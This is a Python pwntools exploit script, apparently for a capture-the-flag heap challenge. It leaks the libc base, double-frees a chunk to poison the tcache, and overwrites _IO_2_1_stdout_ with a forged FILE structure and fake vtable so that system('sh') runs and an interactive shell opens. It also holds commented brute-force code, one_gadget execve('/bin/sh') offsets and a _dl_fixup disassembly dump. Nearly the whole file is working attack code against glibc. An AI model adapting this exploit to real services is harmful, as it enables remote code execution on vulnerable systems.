import argparse
import random
from pwn import *

parser = argparse.ArgumentParser()

parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-r', '--remote')
parser.add_argument('-p', '--port')
parser.add_argument('-e', '--elf')
parser.add_argument('-b', '--binary')
args = parser.parse_args()

context.terminal = '/bin/bash'
# context.log_level = 'debug'# this is a brute wew
# context.binary = args.binary # this just hangs???


p = None # this is global process variable
e = None
env = None
b = None
  # env = {"LD_PRELOAD": os.path.join(os.getcwd(), args.elf)}

if args.elf:
  e = ELF(args.elf)

def pack_file(_flags=0,
              _IO_read_ptr=0,
              _IO_read_end=0,
              _IO_read_base=0,
              _IO_write_base=0,
              _IO_write_ptr=0,
              _IO_write_end=0,
              _IO_buf_base=0,
              _IO_buf_end=0,
              _IO_save_base=0,
              _IO_backup_base=0,
              _IO_save_end=0,
              _IO_marker=0,
              _IO_chain=0,
              _fileno=0,
              _lock=0):

    struct = p32(_flags) + \
        p32(0) + \
        p64(_IO_read_ptr) + \
        p64(_IO_read_end) + \
        p64(_IO_read_base) + \
        p64(_IO_write_base) + \
        p64(_IO_write_ptr) + \
        p64(_IO_write_end) + \
        p64(_IO_buf_base) + \
        p64(_IO_buf_end) + \
        p64(_IO_save_base) + \
        p64(_IO_backup_base) + \
        p64(_IO_save_end) + \
        p64(_IO_marker) + \
        p64(_IO_chain) + \
        p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd8, "\x00")
    return struct

def get_libc():
  p.recvuntil('system ')
  libc_leak = int(p.recvuntil('\n').strip('\n'), 16)
  return libc_leak - e.symbols['system']

def eat_menu():
  p.recvuntil('Your choice: ')

def malloc(size):
  eat_menu()
  p.sendline(str(1))
  p.recvuntil('many: ')
  p.sendline(str(size))

def free(offset):
  eat_menu()
  p.sendline(str(2))
  p.recvuntil("free: ")
  p.sendline(str(offset))

def read(data):
  eat_menu()
  p.sendline(str(3))
  p.recvuntil('in: ')
  p.send(data)


# find an offset to free at:
offset = 0x619fb0 # precalculated for your hacking pleasure
# start = 0x4239c0
# offset = 0
# for i in range(0, 0x222000, 0x10):
#   p = process(args.binary, env=env)
#   offset = start + i
#   libc_base = get_libc()
#   print('Libc is at: ' + hex(libc_base))
#   print('Offset is :' + hex(offset))
#   print('Freeing at:' + hex(offset + libc_base))
#   free(libc_base + offset)

#   try:
#     error = p.recvline()
#     print(error)
#     error = p.recvline()
#     print(error)
#     if '():' in error:
#       p.close()
#       continue
#   except KeyboardInterrupt:
#     exit()
#   except:
#     p.close()
#     continue
#   break # we found what we needed! now lets use it to get shell

print("Offset: " + hex(offset))

context.log_level = 'debug'# this is a brute wew
if args.remote:
  p = remote(args.remote, args.port) # TODO: add a remote service URI here
elif args.binary:
  p = process(args.binary, env=env)
else:
  parser.print_help()
  exit()

if args.elf:
  libc = ELF(args.elf)

if args.debugger:
  if args.remote:
    print("You can't attach a debugger to a remote process")
  else:
    gdb.attach(p) # if in vagrant just run gdb and attach it.

libc_base = get_libc()
libc.address = libc_base
print("Libc base at: " + hex(libc_base))
valid = libc_base + offset
print('Freeing at ' + hex(valid))
free(valid)
free(valid)
malloc(0x38)
# target = libc.symbols['__malloc_hook']
target = libc.symbols['_IO_2_1_stdout_']
payload = p64(target)
read(payload)
malloc(0x38)
print('Freed at ' + hex(valid))
print('Target: ' + hex(target))
malloc(0x38)

one_shot = libc.address + 0x10a38c # maybe_script_execute
off_to_exit = 0x3ade0 # because ld loads off of an offset
# read(p64(one_shot))
# pl = libc_base + one_shot - off_to_exit



io_str_overflow_ptr_addr = libc.symbols['_IO_file_jumps'] + 0xd8
fake_vtable_addr = io_str_overflow_ptr_addr - 0x18

sh_addrs = libc.search('sh\x00')
rdi = 1
while rdi % 2 != 0:
    rdi = sh_addrs.next()

file_struct = pack_file(
    _IO_buf_base=0,
    _IO_buf_end=(rdi - 100) / 2,
    _IO_write_ptr=(rdi - 100) / 2,
    _IO_write_base=0,
    _lock=libc.address + 0x3ecfe0)

file_struct += p64(fake_vtable_addr)
file_struct += p64(libc.symbols['system'])
file_struct += p64(libc.symbols['_IO_2_1_stdout_'])

read(file_struct)

p.interactive()
# p.sendline("cat flag.txt")
# print(p.recvuntil('}'))
# p.close()


'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''


'''
Dump of assembler code for function _dl_fixup:
   0x00007ffb656d8390 <+0>:	endbr64
   0x00007ffb656d8394 <+4>:	push   rbx
   0x00007ffb656d8395 <+5>:	mov    r10,rdi
   0x00007ffb656d8398 <+8>:	mov    esi,esi
   0x00007ffb656d839a <+10>:	lea    rdx,[rsi+rsi*2]
   0x00007ffb656d839e <+14>:	sub    rsp,0x10
   0x00007ffb656d83a2 <+18>:	mov    rax,QWORD PTR [rdi+0x68]
   0x00007ffb656d83a6 <+22>:	mov    rdi,QWORD PTR [rax+0x8]
   0x00007ffb656d83aa <+26>:	mov    rax,QWORD PTR [r10+0xf8]
   0x00007ffb656d83b1 <+33>:	mov    rax,QWORD PTR [rax+0x8]
   0x00007ffb656d83b5 <+37>:	lea    r8,[rax+rdx*8]
   0x00007ffb656d83b9 <+41>:	mov    rax,QWORD PTR [r10+0x70]
   0x00007ffb656d83bd <+45>:	mov    rcx,QWORD PTR [r8+0x8]
   0x00007ffb656d83c1 <+49>:	mov    rbx,QWORD PTR [r8]
   0x00007ffb656d83c4 <+52>:	mov    rax,QWORD PTR [rax+0x8]
   0x00007ffb656d83c8 <+56>:	mov    rdx,rcx
   0x00007ffb656d83cb <+59>:	shr    rdx,0x20
   0x00007ffb656d83cf <+63>:	lea    rsi,[rdx+rdx*2]
   0x00007ffb656d83d3 <+67>:	lea    rsi,[rax+rsi*8]
   0x00007ffb656d83d7 <+71>:	mov    rax,QWORD PTR [r10]
   0x00007ffb656d83da <+74>:	mov    QWORD PTR [rsp+0x8],rsi
   0x00007ffb656d83df <+79>:	add    rbx,rax
   0x00007ffb656d83e2 <+82>:	cmp    ecx,0x7
   0x00007ffb656d83e5 <+85>:	jne    0x7ffb656d852e <_dl_fixup+414>
   0x00007ffb656d83eb <+91>:	test   BYTE PTR [rsi+0x5],0x3
   0x00007ffb656d83ef <+95>:	jne    0x7ffb656d84d0 <_dl_fixup+320>
   0x00007ffb656d83f5 <+101>:	mov    rax,QWORD PTR [r10+0x1d0]
   0x00007ffb656d83fc <+108>:	xor    r8d,r8d
   0x00007ffb656d83ff <+111>:	test   rax,rax
   0x00007ffb656d8402 <+114>:	je     0x7ffb656d8430 <_dl_fixup+160>
   0x00007ffb656d8404 <+116>:	mov    rax,QWORD PTR [rax+0x8]
   0x00007ffb656d8408 <+120>:	movzx  eax,WORD PTR [rax+rdx*2]
   0x00007ffb656d840c <+124>:	and    eax,0x7fff
   0x00007ffb656d8411 <+129>:	lea    rdx,[rax+rax*2]
   0x00007ffb656d8415 <+133>:	mov    rax,QWORD PTR [r10+0x2e8]
   0x00007ffb656d841c <+140>:	lea    r8,[rax+rdx*8]
   0x00007ffb656d8420 <+144>:	mov    eax,0x0
   0x00007ffb656d8425 <+149>:	mov    r9d,DWORD PTR [r8+0x8]
   0x00007ffb656d8429 <+153>:	test   r9d,r9d
   0x00007ffb656d842c <+156>:	cmove  r8,rax
   0x00007ffb656d8430 <+160>:	mov    edx,DWORD PTR fs:0x18
   0x00007ffb656d8438 <+168>:	mov    eax,0x1
   0x00007ffb656d843d <+173>:	test   edx,edx
   0x00007ffb656d843f <+175>:	jne    0x7ffb656d8518 <_dl_fixup+392>
   0x00007ffb656d8445 <+181>:	mov    esi,DWORD PTR [rsi]
   0x00007ffb656d8447 <+183>:	mov    rcx,QWORD PTR [r10+0x388]
   0x00007ffb656d844e <+190>:	lea    rdx,[rsp+0x8]
   0x00007ffb656d8453 <+195>:	push   0x0
   0x00007ffb656d8455 <+197>:	push   rax
   0x00007ffb656d8456 <+198>:	mov    r9d,0x1
   0x00007ffb656d845c <+204>:	add    rdi,rsi
   0x00007ffb656d845f <+207>:	mov    rsi,r10
   0x00007ffb656d8462 <+210>:	call   0x7ffb656d39c0 <_dl_lookup_symbol_x>
   0x00007ffb656d8467 <+215>:	mov    r8,rax
   0x00007ffb656d846a <+218>:	mov    eax,DWORD PTR fs:0x18
   0x00007ffb656d8472 <+226>:	pop    rcx
   0x00007ffb656d8473 <+227>:	pop    rsi
   0x00007ffb656d8474 <+228>:	test   eax,eax
   0x00007ffb656d8476 <+230>:	jne    0x7ffb656d84e0 <_dl_fixup+336>
   0x00007ffb656d8478 <+232>:	mov    rsi,QWORD PTR [rsp+0x8]
   0x00007ffb656d847d <+237>:	xor    eax,eax
   0x00007ffb656d847f <+239>:	test   rsi,rsi
   0x00007ffb656d8482 <+242>:	je     0x7ffb656d84a3 <_dl_fixup+275>
   0x00007ffb656d8484 <+244>:	cmp    WORD PTR [rsi+0x6],0xfff1
   0x00007ffb656d8489 <+249>:	je     0x7ffb656d84c0 <_dl_fixup+304>
   0x00007ffb656d848b <+251>:	test   r8,r8
   0x00007ffb656d848e <+254>:	je     0x7ffb656d84c0 <_dl_fixup+304>
   0x00007ffb656d8490 <+256>:	mov    rax,QWORD PTR [r8]                 # breakpoint right here
   0x00007ffb656d8493 <+259>:	movzx  edx,BYTE PTR [rsi+0x4]
   0x00007ffb656d8497 <+263>:	add    rax,QWORD PTR [rsi+0x8]
   0x00007ffb656d849b <+267>:	and    edx,0xf
   0x00007ffb656d849e <+270>:	cmp    dl,0xa
   0x00007ffb656d84a1 <+273>:	je     0x7ffb656d84c8 <_dl_fixup+312>
   0x00007ffb656d84a3 <+275>:	mov    edx,DWORD PTR [rip+0x1b23f]        # 0x7ffb656f36e8 <_rtld_local_ro+72>
   0x00007ffb656d84a9 <+281>:	test   edx,edx
   0x00007ffb656d84ab <+283>:	jne    0x7ffb656d84b0 <_dl_fixup+288>
   0x00007ffb656d84ad <+285>:	mov    QWORD PTR [rbx],rax
=> 0x00007ffb656d84b0 <+288>:	add    rsp,0x10
   0x00007ffb656d84b4 <+292>:	pop    rbx
   0x00007ffb656d84b5 <+293>:	ret
   0x00007ffb656d84b6 <+294>:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x00007ffb656d84c0 <+304>:	xor    eax,eax
   0x00007ffb656d84c2 <+306>:	jmp    0x7ffb656d8493 <_dl_fixup+259>
   0x00007ffb656d84c4 <+308>:	nop    DWORD PTR [rax+0x0]
   0x00007ffb656d84c8 <+312>:	call   rax
   0x00007ffb656d84ca <+314>:	jmp    0x7ffb656d84a3 <_dl_fixup+275>
   0x00007ffb656d84cc <+316>:	nop    DWORD PTR [rax+0x0]
   0x00007ffb656d84d0 <+320>:	cmp    WORD PTR [rsi+0x6],0xfff1
   0x00007ffb656d84d5 <+325>:	mov    edx,0x0
   0x00007ffb656d84da <+330>:	cmove  rax,rdx
   0x00007ffb656d84de <+334>:	jmp    0x7ffb656d8493 <_dl_fixup+259>
   0x00007ffb656d84e0 <+336>:	xor    eax,eax
   0x00007ffb656d84e2 <+338>:	xchg   DWORD PTR fs:0x1c,eax
   0x00007ffb656d84ea <+346>:	cmp    eax,0x2
   0x00007ffb656d84ed <+349>:	jne    0x7ffb656d8478 <_dl_fixup+232>
   0x00007ffb656d84ef <+351>:	mov    rdi,QWORD PTR fs:0x10
   0x00007ffb656d84f8 <+360>:	xor    r10d,r10d
   0x00007ffb656d84fb <+363>:	add    rdi,0x1c
   0x00007ffb656d84ff <+367>:	mov    edx,0x1
   0x00007ffb656d8504 <+372>:	mov    esi,0x81
   0x00007ffb656d8509 <+377>:	mov    eax,0xca
   0x00007ffb656d850e <+382>:	syscall
   0x00007ffb656d8510 <+384>:	jmp    0x7ffb656d8478 <_dl_fixup+232>
   0x00007ffb656d8515 <+389>:	nop    DWORD PTR [rax]
   0x00007ffb656d8518 <+392>:	mov    DWORD PTR fs:0x1c,0x1
   0x00007ffb656d8524 <+404>:	mov    eax,0x5
   0x00007ffb656d8529 <+409>:	jmp    0x7ffb656d8445 <_dl_fixup+181>
   0x00007ffb656d852e <+414>:	lea    rcx,[rip+0x152e3]        # 0x7ffb656ed818 <__PRETTY_FUNCTION__.11365>
   0x00007ffb656d8535 <+421>:	mov    edx,0x50
   0x00007ffb656d853a <+426>:	lea    rsi,[rip+0x13016]        # 0x7ffb656eb557
   0x00007ffb656d8541 <+433>:	lea    rdi,[rip+0x15298]        # 0x7ffb656ed7e0
   0x00007ffb656d8548 <+440>:	call   0x7ffb656e3520 <__GI___assert_fail>
   '''